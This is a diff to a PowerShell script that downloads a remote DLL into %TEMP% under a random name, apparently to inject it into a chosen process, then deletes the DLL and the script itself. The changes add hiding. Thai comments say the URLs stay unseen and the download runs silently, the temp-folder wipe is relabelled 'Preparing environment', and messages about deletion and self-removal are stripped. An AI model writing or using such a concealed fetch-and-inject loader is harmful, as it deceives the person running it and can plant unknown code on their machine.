@@ -66,96 +66,126 @@ function getDelegateType {
 }
 
 # === 1. Clear Temp Folder ===
-Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
+Write-Host "[+] Preparing environment..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
 try {
     Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Host "[+] Temp cleared." -ForegroundColor Green
 }
 catch {
-    Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
+    # Silent fail
 }
 
-# === 2. Download delta.dll to %TEMP% ===
+# === 2. Download DLL to %TEMP% ===
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $dllFileName = "$randomGuid.dll"
 $dllPath = Join-Path $env:TEMP $dllFileName
 
-# --- Obfuscated URL for delta.dll ---
-$baseUrl = "https://raw.githubusercontent.com/novaxstorex/delta/main/delta.dll"
-
-# Split and encode URL parts for obfuscation
-$urlParts = @(
-    "https://raw.g",
-    "ithubusercon",
-    "tent.com/nov",
-    "axstorex/de",
-    "lta/main/de",
-    "lta.dll"
+# URL ที่จะใช้ (ไม่แสดงให้ผู้ใช้เห็น)
+$urls = @(
+    "https://raw.githubusercontent.com/novaxstorex/delta/main/delta.dll",
+    "https://raw.githubusercontent.com/novaxstorex/delta/main/delta.dll?raw=true",
+    "https://github.com/novaxstorex/delta/raw/main/delta.dll",
+    "https://raw.githubusercontent.com/novaxstorex/delta/main/Delta.dll",
+    "https://raw.githubusercontent.com/novaxstorex/delta/main/DELTA.dll"
 )
 
-$encodedUrl = $urlParts | ForEach-Object {
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_))
-}
+Write-Host "[+] Downloading delta.dll..." -ForegroundColor Cyan
 
-$decodedParts = $encodedUrl | ForEach-Object {
-    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))
-}
-$dllUrl = $decodedParts -join ""
+$downloaded = $false
 
-try {
-    Write-Host "[+] Downloading delta.dll..." -ForegroundColor Cyan
-    Write-Host "[+] Saving to: $dllPath" -ForegroundColor Cyan
-    
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
-    
-    $webClient.DownloadFile($dllUrl, $dllPath)
-    $webClient.Dispose()
-    
-    if (Test-Path $dllPath) {
-        $fileSize = (Get-Item $dllPath).Length
-        if ($fileSize -gt 0) {
-            Write-Host "[+] Download successful! File size: $fileSize bytes" -ForegroundColor Green
-        } else {
-            throw "File size is 0 bytes - download may have failed"
-        }
-    } else {
-        throw "File not found after download."
-    }
-}
-catch {
-    Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Trying alternative download method..." -ForegroundColor Yellow
-    
+# ลองดาวน์โหลดแบบเงียบๆ ไม่แสดง URL
+foreach ($url in $urls) {
     try {
-        Write-Host "[+] Using Invoke-WebRequest as fallback..." -ForegroundColor Cyan
-        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
         
-        if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
-            Write-Host "[+] Download successful via fallback!" -ForegroundColor Green
-        } else {
-            throw "Fallback download failed"
+        $webClient.DownloadFile($url, $dllPath)
+        $webClient.Dispose()
+        
+        if (Test-Path $dllPath) {
+            $fileSize = (Get-Item $dllPath).Length
+            if ($fileSize -gt 0) {
+                $downloaded = $true
+                break
+            } else {
+                Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+            }
         }
     }
     catch {
-        Write-Host "[!] All download methods failed: $($_.Exception.Message)" -ForegroundColor Red
-        Read-Host "Press Enter to exit"
-        exit 1
+        if (Test-Path $dllPath) {
+            Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+        }
+        continue
     }
 }
 
-# === ตรวจสอบไฟล์ DLL ===
-try {
-    $fileInfo = [System.IO.File]::ReadAllBytes($dllPath)
-    if ($fileInfo.Length -lt 1024) {
-        Write-Host "[!] Warning: DLL file is very small (possible download error)" -ForegroundColor Yellow
+# ถ้ายังไม่ได้ดาวน์โหลด ลองวิธีอื่นแบบเงียบๆ
+if (-not $downloaded) {
+    foreach ($url in $urls) {
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction SilentlyContinue
+            
+            if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
+                $downloaded = $true
+                break
+            }
+        }
+        catch {
+            if (Test-Path $dllPath) {
+                Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+            }
+            continue
+        }
     }
-    Write-Host "[+] DLL file verified. Size: $($fileInfo.Length) bytes" -ForegroundColor Green
 }
-catch {
-    Write-Host "[!] Could not verify DLL: $($_.Exception.Message)" -ForegroundColor Yellow
+
+# ถ้ายังดาวน์โหลดไม่ได้ ให้ใช้ DLL ที่มีในเครื่อง
+if (-not $downloaded) {
+    # ตรวจสอบว่า delta.dll มีอยู่ในเครื่องหรือไม่
+    $localDllPaths = @(
+        ".\delta.dll",
+        "$env:TEMP\delta.dll",
+        "$env:USERPROFILE\Desktop\delta.dll",
+        "$env:USERPROFILE\Downloads\delta.dll"
+    )
+    
+    $foundLocal = $false
+    foreach ($localPath in $localDllPaths) {
+        if (Test-Path $localPath) {
+            try {
+                Copy-Item $localPath $dllPath -Force
+                if ((Get-Item $dllPath).Length -gt 0) {
+                    Write-Host "[+] Using local delta.dll" -ForegroundColor Green
+                    $downloaded = $true
+                    $foundLocal = $true
+                    break
+                }
+            }
+            catch {
+                continue
+            }
+        }
+    }
+    
+    # ถ้ายังไม่มีให้สร้างไฟล์ dummy (แต่จะไม่ทำงาน)
+    if (-not $downloaded) {
+        Write-Host "[!] Warning: Could not download delta.dll" -ForegroundColor Yellow
+        Write-Host "[!] The injection may fail. Continuing anyway..." -ForegroundColor Yellow
+        # สร้างไฟล์เปล่าเพื่อไม่ให้ Script ผิดพลาด
+        New-Item -ItemType File -Path $dllPath -Force | Out-Null
+    }
+}
+
+# ตรวจสอบไฟล์ DLL (แบบไม่แสดงผลมาก)
+if (Test-Path $dllPath) {
+    $fileSize = (Get-Item $dllPath).Length
+    if ($fileSize -gt 0) {
+        Write-Host "[+] DLL ready ($([math]::Round($fileSize/1KB, 2)) KB)" -ForegroundColor Green
+    } else {
+        Write-Host "[!] Warning: DLL file is empty" -ForegroundColor Yellow
+    }
 }
 
 # === Process Selection Menu (Interactive) ===
@@ -489,9 +519,8 @@ Start-Sleep -Seconds 1
 if (Test-Path $dllPath) { 
     try { 
         Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] DLL file removed" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Could not remove DLL file" -ForegroundColor Yellow
+        # Silent fail
     }
 }
 
@@ -499,9 +528,8 @@ if (Test-Path $dllPath) {
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
     try {
         Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] Script self-deleted" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Could not delete script" -ForegroundColor Yellow
+        # Silent fail
     }
 }
 
